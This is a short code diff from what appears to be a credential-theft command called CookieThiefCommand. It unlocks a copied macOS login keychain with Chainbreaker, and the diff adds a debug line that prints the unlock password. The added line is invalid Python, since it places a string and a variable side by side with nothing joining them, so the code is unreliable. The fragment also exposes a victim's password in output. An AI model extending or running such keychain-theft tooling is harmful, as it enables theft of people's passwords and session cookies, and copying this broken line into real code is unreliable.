@@ -76,6 +76,9 @@ class CookieThiefCommand(CommandBase):
             print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
             sys.stdout.flush()
 
+        ##DEBUG:
+        print("Password: " password)
+
         try:
             keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=password, unlock_key=None,
                                     unlock_file=None)
